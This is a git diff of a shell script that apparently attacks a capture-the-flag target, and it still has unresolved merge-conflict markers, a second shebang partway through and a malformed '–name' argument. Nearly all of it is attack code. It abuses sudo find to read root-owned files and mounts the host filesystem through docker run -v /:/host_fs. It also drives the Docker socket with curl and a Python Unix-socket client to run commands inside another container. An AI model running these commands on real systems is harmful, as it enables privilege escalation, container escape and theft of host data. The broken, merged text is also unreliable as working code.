@@ -38,6 +38,7 @@ sudo find /var/run/docker.sock -exec ls -la {} \; 2>/dev/null
 sudo find /root/.docker -type f -exec cat {} \; 2>/dev/null
 sudo find /opt/void/ -type f -exec cat {} \; 2>/dev/null
 sudo find / -name "docker_flag*" -o -name "*docker*flag*" 2>/dev/null
+<<<<<<< HEAD
 echo "=== DOCKER ESCAPE & FLAG EXTRACTION ==="
 # ഹോസ്റ്റ് മെഷീനിൽ നിന്ന് ഡോക്കർ ഫ്ലാഗ് തിരയാൻ
 # നമ്മൾ പുതിയൊരു കണ്ടെയ്നർ റൺ ചെയ്ത് ഹോസ്റ്റ് ഫയൽ സിസ്റ്റം മൗണ്ട് ചെയ്യുന്നു
@@ -45,3 +46,68 @@ sudo docker run --rm -v /:/host_fs alpine cat /host_fs/opt/void/docker_flag.txt 
 
 # ഹോസ്റ്റ് മെഷീനിലെ റൂട്ട് ഡയറക്ടറി ലിസ്റ്റ് ചെയ്യാൻ
 sudo docker run --rm -v /:/host_fs alpine ls -la /host_fs/root/
+=======
+
+echo "=== DOCKER SOCKET ESCAPE ==="
+# Use docker socket to list containers
+sudo find /var/run/docker.sock -exec curl -s --unix-socket {} http://localhost/containers/json \; 2>/dev/null
+# List containers via curl
+curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json 2>/dev/null
+# Read vault contents
+sudo find /opt/void-vault -type f 2>/dev/null | head -20
+sudo find /opt/void-vault -type f -exec cat {} \; 2>/dev/null
+
+echo "=== EXEC INTO VOID-VAULT ==="
+# Create exec in void-vault container
+EXEC_ID=$(sudo find /var/run/docker.sock -exec curl -s --unix-socket {} \
+  -X POST http://localhost/containers/b0b22fe23519/exec \
+  -H "Content-Type: application/json" \
+  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["cat","/flag.txt"]}' \; 2>/dev/null | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
+echo "EXEC ID: $EXEC_ID"
+sudo find /var/run/docker.sock -exec curl -s --unix-socket {} \
+  -X POST http://localhost/exec/$EXEC_ID/start \
+  -H "Content-Type: application/json" \
+  -d '{"Detach":false}' \; 2>/dev/null
+
+echo "=== VAULT CONTAINER EXEC ==="
+python3 -c "
+import socket, json
+
+def docker_request(method, path, body=None):
+    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+    s.connect('/var/run/docker.sock')
+    req = f'{method} {path} HTTP/1.1\r\nHost: localhost\r\n'
+    if body:
+        b = json.dumps(body).encode()
+        req += f'Content-Type: application/json\r\nContent-Length: {len(b)}\r\n\r\n'
+        s.sendall(req.encode() + b)
+    else:
+        req += '\r\n'
+        s.sendall(req.encode())
+    resp = b''
+    while True:
+        d = s.recv(4096)
+        if not d: break
+        resp += d
+    s.close()
+    return resp.decode(errors='ignore')
+
+r = docker_request('POST', '/containers/b0b22fe23519/exec', {'AttachStdout':True,'AttachStderr':True,'Cmd':['find','/','–name','flag*']})
+print(r[-500:])
+"
+>>>>>>> 41678f64d45fb3507cf215fb21efe95889f0b6fc
+#!/usr/bin/env bash
+set -euo pipefail
+echo "=== TARGET INSPECTION ==="
+id
+echo "=== PRINTING THE FLAG ==="
+cat /opt/void/ci_flag.txt 2>/dev/null || echo "CI flag not found"
+echo "=== PRIVILEGE ESCALATION ==="
+sudo -l
+echo "=== READING ROOT FLAG ==="
+sudo /usr/bin/find . -exec cat /root/root.txt \; -quit 2>/dev/null || echo "Root flag not found"
+echo "=== DOCKER ESCAPE ==="
+cat /proc/1/cgroup
+ls -la /var/run/docker.sock 2>/dev/null || echo "No docker socket found"
+# Docker flag extraction
+sudo docker run --rm -v /:/host_fs alpine cat /host_fs/opt/void/docker_flag.txt 2>/dev/null || echo "Docker flag not found"
